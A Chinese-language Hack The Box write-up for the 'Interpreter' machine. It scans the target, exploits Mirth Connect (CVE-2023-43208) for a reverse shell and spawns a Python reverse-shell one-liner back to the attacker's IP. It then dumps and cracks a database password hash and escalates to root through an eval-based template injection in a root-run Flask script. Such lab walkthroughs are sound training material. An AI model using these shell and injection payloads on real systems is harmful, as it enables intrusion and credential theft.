---
title: HTB Interpreter
published: 2026-06-29
tags: [HTB,Linux]
category: PenTest
draft: false
image: 'image.png'
---

## 前言

大概期中考之前有打出一些 Season 10 的靶機，原本想說 Seanson 11 出來之後就把 wp 給放出來，但是被期末考搞完之後就懶得做ㄌ，今天打完行政院攻擊手才想起來XD

## Recon

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ rustscan -a 10.129.244.184 --ulimit 5000 -r 1-65535 -- -sC -sV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/home/dkri3c1/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.244.184:22
Open 10.129.244.184:80
Open 10.129.244.184:443
Open 10.129.244.184:6661
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.129.244.184
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 21:43 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:43
Completed NSE at 21:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:43
Completed NSE at 21:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:43
Completed NSE at 21:43, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:43
Completed Parallel DNS resolution of 1 host. at 21:43, 0.14s elapsed
DNS resolution of 1 IPs took 0.14s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 21:43
Scanning 10.129.244.184 [4 ports]
Discovered open port 22/tcp on 10.129.244.184
Discovered open port 443/tcp on 10.129.244.184
Discovered open port 6661/tcp on 10.129.244.184
Discovered open port 80/tcp on 10.129.244.184
Completed SYN Stealth Scan at 21:43, 0.10s elapsed (4 total ports)
Initiating Service scan at 21:43
Scanning 4 services on 10.129.244.184
Completed Service scan at 21:46, 169.39s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.244.184.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 14.32s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 1.86s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
Nmap scan report for 10.129.244.184
Host is up, received user-set (0.074s latency).
Scanned at 2026-03-04 21:43:53 EST for 186s

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDVuD7K78VPFJrRRqOF1sCo4+cr9vm+x+VG1KLHzsgeEp3WWH2MIzd0yi/6eSzNDprifXbxlBCdvIR/et0G0lKI=
|   256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILAfcF/jsYtk8PnokOcYPpkfMdPrKcKdjel2yqgNEtU3
80/tcp   open  http     syn-ack ttl 63 Jetty
|_http-favicon: Unknown favicon MD5: 62BE2608829EE4917ACB671EF40D5688
|_http-title: Mirth Connect Administrator
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http syn-ack ttl 63 Jetty
| ssl-cert: Subject: commonName=mirth-connect
| Issuer: commonName=Mirth Connect Certificate Authority
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-19T12:50:05
| Not valid after:  2075-09-19T12:50:05
| MD5:   c251:9050:6882:4177:9dbc:c609:d325:dd54
| SHA-1: 3f2b:a7d8:5c81:9ecf:6e15:cb6a:fdc6:df02:8d9b:1179
| -----BEGIN CERTIFICATE-----
| MIIHDjCCBfagAwIBAgIHAs1vd37U6TANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQD
| DCNNaXJ0aCBDb25uZWN0IENlcnRpZmljYXRlIEF1dGhvcml0eTAgFw0yNTA5MTkx
| MjUwMDVaGA8yMDc1MDkxOTEyNTAwNVowGDEWMBQGA1UEAwwNbWlydGgtY29ubmVj
| dDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcl1ZyZfUY55vGMEHQp
| Kv42F90HswreFnh1UZtrRTPBLZEG8Mp4dwsUSdnyZRjWliW/w9E7trGlt2kg9NmS
| 0aH1zwFbRMgO6RvlGH8Y3qSYK1Xz7vz4nq8dklfDQEeHkKOorxkjrHZ5nsIuotQ1
| rMNQ3IO6bGCrzozodanm1kvGADImobIqQg82NUG+lUf33ltW4DA8YosZebcOGtaz
| A0E3ZhEau3izPfhgTYOxYEw0+71uPK1iS1gMPgkZOSEOeatoER0l+tISNGujBwx6
| p0qEOVKuyD1ckPeLQ3W5tySooZHV7dAxtYP5bWEUWIpHWkNENL9hHa1HHu/0hFTh
| xxUCAwEAAaOCBEMwggQ/MIIDBAYDVR0jBIIC+zCCAveAggLzMIIC7zCCAdegAwIB
| AgIBATANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDDCNNaXJ0aCBDb25uZWN0IENl
| cnRpZmljYXRlIEF1dGhvcml0eTAgFw0yNTA5MTkxMjUwMDVaGA8yMDc1MDkxOTEy
| NTAwNVowLjEsMCoGA1UEAwwjTWlydGggQ29ubmVjdCBDZXJ0aWZpY2F0ZSBBdXRo
| b3JpdHkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCx5tdSOdln2NVP
| 2ENEc4CQmkkY/1O64NLvBnWr+Zu8AWyzFRBiGceqIXnWIpKWO5xxSObqsMiS2uSL
| Cj3/sprvfX+mojkmrZvpIYDqTQoayWjdI/MAn76VBZrZ4tGyPKibM6msLC/PNeSV
| JtGneR0GtT1yB3VGYfSEOJeIJLa2+PcHERSg2b+xBsrsWmGqwTIwl6NG3MPczmUD
| xomVpz7EpMZFka4slmRT81W9lIpgXl/jVAgLFoZUQ0q7ta1E0WdfeWkjMf0qEF5s
| LSm4UjDRkq/+xR8eZ7K1NBQL+1sUlmyhnfJnTGfik13g0xfpH1WNWsaHbRi6G70M
| zQs51qrlAgMBAAGjFjAUMBIGA1UdEwEB/wQIMAYBAf8CAQAwDQYJKoZIhvcNAQEL
| BQADggEBAFB4ZKwCdqnPqNWZhEi4XRoQY0/5bG/td+XP8a3lyudHQR6+JG8W2/DG
| MreycjnadJCaMn/KfBHULtUgbnpsCSJHQG/xmBS9jeT8NUu2R87xKypU7F0r08A2
| T9bduARSWYAJLF8g3UVGhC1o5fU+t0j3zUVEGKHdlC2GioZV9Jg5e7BIo/iqrLcX
| D6QOBOi509oMLYN40ijI6Q4KT0x01oDemPuirqo6CVg4fKnVjBGdXeWGdsH9DZsK
| O5zpxT2DcNXtFn7WdI+0FlUn+1Az+rFzuQlDZfyUAxiYXtL4ZaOGYKNNjKCECquv
| pdO2OKdCcl6oCIBJfRGDnh2Q7FIqK5wwggEzBgNVHQ4EggEqBIIBJjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOcl1ZyZfUY55vGMEHQpKv42F90Hswre
| Fnh1UZtrRTPBLZEG8Mp4dwsUSdnyZRjWliW/w9E7trGlt2kg9NmS0aH1zwFbRMgO
| 6RvlGH8Y3qSYK1Xz7vz4nq8dklfDQEeHkKOorxkjrHZ5nsIuotQ1rMNQ3IO6bGCr
| zozodanm1kvGADImobIqQg82NUG+lUf33ltW4DA8YosZebcOGtazA0E3ZhEau3iz
| PfhgTYOxYEw0+71uPK1iS1gMPgkZOSEOeatoER0l+tISNGujBwx6p0qEOVKuyD1c
| kPeLQ3W5tySooZHV7dAxtYP5bWEUWIpHWkNENL9hHa1HHu/0hFThxxUCAwEAATAN
| BgkqhkiG9w0BAQsFAAOCAQEAKEQK8YNzAWgPB07ydf05p277ISLa2T+rWzQ2cCPD
| amgc1lCOHK0pEdNMI2z4J+iNdeXiPpuBVgvKId6I8ETLdA7foFRGklv6W6t4MjMY
| Pte8+PPkhKdwRVLzEj/tae427Ar8daDCvyFK/IhunhugyxfywHNj665V+bqPLBGw
| bgiV7+CQKpNOeADBeGbZpEGfQb+U+RkLCpjq7don698TdeBIPcIErzDgS8PDZ217
| Y0o4EU9gaX6U42cpvD/LLZ+e87GRxBlm9ivRA8QAE+yqo8GZtWvYveLkg+7qNcWB
| nWXyOijePyLYSHl4QHn3F4nTx2bO16KspRrDZsmiZGyEIw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
6661/tcp open  unknown  syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:46
Completed NSE at 21:46, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.05 seconds
           Raw packets sent: 4 (176B) | Rcvd: 4 (176B)

                                     
```

## Exploit 

連上去網頁，看起來是一個醫療用的網頁框架

![Screenshot 2026-03-05 at 10.47.13 AM](https://hackmd.io/_uploads/BkgT0w8tZx.png)

而點下去 `Launch Mirth Connect Administrator` 可以載到 `webstart.jnlp`，可以在裡面發現這個服務的版本是 `4.4.0`

![Screenshot 2026-03-05 at 10.50.48 AM](https://hackmd.io/_uploads/ryN9yOLKZg.png)

拿去 google 看看有沒有 CVE，看了這篇文章

https://horizon3.ai/attack-research/disclosures/nextgen-mirth-connect-remote-code-execution/

發現有個 pre-auth RCE -> CVE-2023-43208，在 github 找到這篇 POC

https://github.com/kyakei/CVE-2023-43208

```bash=
python3 exploit.py shell -t https://10.129.244.184 --lhost 10.10.14.196 --lport 4444
```

彈了 reverse shell，然後目前權限是 mirth

```bash=
id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
whoami
mirth
```

在 `/home` 看到使用者叫做 `sedric`，目前要做的是提權，開始撈垃圾

在 `/usr/local/mirthconnect/conf` 上面的`mirth.properties` 找到 db 的 credentials

```bash=
# database credentials
database.username = mirthdb
database.password = MirthPass123!
```

因為原本的 reversed shell 會沒辦法顯示 databases 的內容，所以檢查上面有的工具，發現有 python，用 python 再彈一個 reverse shell 出來

```bash=
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.196",4455));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

之後就用連上 mysql 的語法

```bash=
┌──(dkri3c1🐱dkri3c1)-[~]
└─$ nc -lvnp 4455
listening on [any] 4455 ...
connect to [10.10.14.196] from (UNKNOWN) [10.129.244.184] 42374
$ s
s
sh: 1: s: not found
$ mysql -h localhost -u mirthdb -p
mysql -h localhost -u mirthdb -p
Enter password: MirthPass123!

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 43
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

而在 mc_bdd_prod 上找到 password 的 hash

```bash=
MariaDB [information_schema]> use mc_bdd_prod;
use mc_bdd_prod;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mc_bdd_prod]> show tables
show tables
    -> ;
;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
21 rows in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
select * from PERSON_PASSWORD;
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.001 sec)

MariaDB [mc_bdd_prod]> 
```

找到 https://github.com/Pegasus0xx/Mirth-PBKDF2-Cracker/tree/main

把腳本拿去用

成功取得密碼之後，就拿去登入 ssh ，便可以拿到 user flag

> 821431...

之後就開始提權地獄 sudo 大法砸下去發現沒有 sudo 這個指令 L

```bash=
sedric@interpreter:~$ sudo -l
-bash: sudo: command not found
sedric@interpreter:~$ sudo -i
-bash: sudo: command not found
sedric@interpreter:~$
```

用 ps -aux 看目前有跑什麼程式

```bash=
sedric@interpreter:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 102024 12000 ?        Ss   07:04   0:00 /sbin/init
root           2  0.0  0.0      0     0 ?        S    07:04   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   07:04   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   07:04   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   07:04   0:00 [slub_flushwq]
root           6  0.0  0.0      0     0 ?        I<   07:04   0:00 [netns]
root           7  0.0  0.0      0     0 ?        I    07:04   0:00 [kworker/0:0-events]
root           8  0.0  0.0      0     0 ?        I<   07:04   0:00 [kworker/0:0H-events_highpri]
root          10  0.0  0.0      0     0 ?        I<   07:04   0:00 [mm_percpu_wq]
root          11  0.0  0.0      0     0 ?        I    07:04   0:00 [rcu_tasks_kthread]
root          12  0.0  0.0      0     0 ?        I    07:04   0:00 [rcu_tasks_rude_kthread]
root          13  0.0  0.0      0     0 ?        I    07:04   0:00 [rcu_tasks_trace_kthread]
root          14  0.0  0.0      0     0 ?        S    07:04   0:00 [ksoftirqd/0]
root          15  0.0  0.0      0     0 ?        I    07:04   0:00 [rcu_preempt]
root          16  0.0  0.0      0     0 ?        S    07:04   0:00 [migration/0]
root          18  0.0  0.0      0     0 ?        S    07:04   0:00 [cpuhp/0]
root          19  0.0  0.0      0     0 ?        S    07:04   0:00 [cpuhp/1]
root          20  0.0  0.0      0     0 ?        S    07:04   0:00 [migration/1]
root          21  0.0  0.0      0     0 ?        S    07:04   0:00 [ksoftirqd/1]
root          23  0.0  0.0      0     0 ?        I<   07:04   0:00 [kworker/1:0H-events_highpri]
```
...

直到發現
```
root        3572  0.0  0.7  39872 31060 ?        Ss   07:04   0:00 /usr/bin/python3 /usr/local/bin/notif.py
```

cat 他看看檔案細節

```bash=
sedric@interpreter:~$ cat /usr/local/bin/notif.py 
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)

```

這段 code 大過就是 parse xml 的資料，但是仔細看的話 line 32 的話他用了 eval 這個 function，再加上他又是用 root 去跑，所以大致上可以利用這個問題去提權

這邊先送正常的資料給他 parse 看看

```bash=
sedric@interpreter:~$ cat a.py
import requests

url = "http://localhost:54321/addPatient"


info = """<patient>
<firstname>NMSL</firstname>
<lastname>User</lastname>
<sender_app>APP</sender_app>
<timestamp>123456</timestamp>
<birth_date>01/01/2000</birth_date>
<gender>M</gender>
</patient>"""


r = requests.post(url,data=info)

print(r.text)
sedric@interpreter:~$ python3 a.py
Patient NMSL User (M), 26 years old, received from APP at 123456
```

因為前面正則表達式規定只能用 `{` `}` `(` `)` `'` `"` 的關係，所以這邊就去 cheat sheet 上幹了一個 payload 來用 `{open("/root/root.txt").read()}`

把它加到 <firstname> 這個標籤就好了
    
    
get root flag

```
691ee....
```


## Pwned!

![Screenshot 2026-03-20 at 7.39.40 PM](https://hackmd.io/_uploads/BkqWM35qbg.png)
